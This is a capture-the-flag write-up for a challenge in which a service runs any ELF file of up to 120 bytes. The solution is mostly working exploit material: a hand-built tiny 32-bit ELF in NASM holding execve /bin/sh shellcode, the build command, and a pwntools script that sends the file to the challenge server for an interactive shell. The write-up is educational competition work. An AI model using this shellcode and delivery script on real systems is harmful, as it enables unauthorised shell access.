# Misc

<!-- challenge-index: 83a07147d1361aac -->

| Challenge | Topic |
| --- | --- |
| [Santa's Little Helper (463 pts)](#santas-little-helper-463-pts) | ELF, Size-Constrained Binaries |

<!-- /challenge-index -->

## Santa's Little Helper (463 pts)

### Description

Santa doesn't have a lot of room left in his sleigh. Help him fit one more item

### Solution

Decompile the given file using IDA.

```c
v10 = __readfsqword(0x28u);
  read(0, buf, 0x78uLL);
  v8 = 0x10102464C457FLL;
  for ( i = 0; i <= 7; ++i )
  {
    if ( buf[i - 8] != buf[i] )
    {
      write(1, "Not an ELF file\n", 0x10uLL);
      exit(1);
    }
  }
  fd = memfd_create("program", 0LL);
  if ( fd == -1 )
  {
    write(1, "Failed to create memfd\n", 0x17uLL);
    exit(1);
  }
  write(fd, buf, 0x78uLL);
  argva = 0LL;
  envpa = 0LL;
  if ( fexecve(fd, &argva, &envpa) == -1 )
  {
    write(1, "Failed to execute\n", 0x12uLL);
    exit(1);
  }
  return 0;
```

The program above validate the header of the file is ELF or not, if ELF it will be written to memory wit only size 120 then it will be executed. So in this challenge we need to send ELF file which has maximum length 120 bytes to get the flag. During the competition my teammates (hanasuru) found this [reference](https://blog.stalkr.net/2014/10/tiny-elf-3264-with-nasm.html). From that reference we can see that the size for 32bit is smaller than 64bit. So i choose 32bit, but when i send the ELF it  shown "Not an ELF file" because of the header was invalid. So changing the header from `0x7F, "ELF", 1, 1, 1, 0` to `0x7F, "ELF", 2, 1, 1, 0` will fix this (based on the given executable). After that just search shellcode that spawn shell then compile it using nasm.

```nasm
BITS 32
                org     0x08048000
 
ehdr:                                                   ; Elf32_Ehdr
                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
        times 8 db      0
                dw      2                               ;   e_type
                dw      3                               ;   e_machine
                dd      1                               ;   e_version
                dd      _start                          ;   e_entry
                dd      phdr - $$                       ;   e_phoff
                dd      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
 
  ehdrsize      equ     $ - ehdr
 
phdr:                                                   ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      0                               ;   p_offset
                dd      $$                              ;   p_vaddr
                dd      $$                              ;   p_paddr
                dd      filesize                        ;   p_filesz
                dd      filesize                        ;   p_memsz
                dd      5                               ;   p_flags
                dd      0x1000                          ;   p_align
 
  phdrsize      equ     $ - phdr
 
_start:
  	xor    eax, eax
	push   eax
	push   0x68732f2f
	push   0x6e69622f
	mov    ebx, esp
	push   eax
	push   ebx
	mov    ecx, esp
	mov    al, 0xb
	int    0x80
 
filesize      equ     $ - $$
```

Compile with command below

```
nasm -f bin -o tiny32 tiny32.asm
```

Send it using pwntools and got the shell

```python
from pwn import *

r = remote("challs.tfcctf.com", 32051)
f = open("tiny32", "rb").read()
r.sendline(f)
r.interactive()
```

Flag: TFCCTF{}
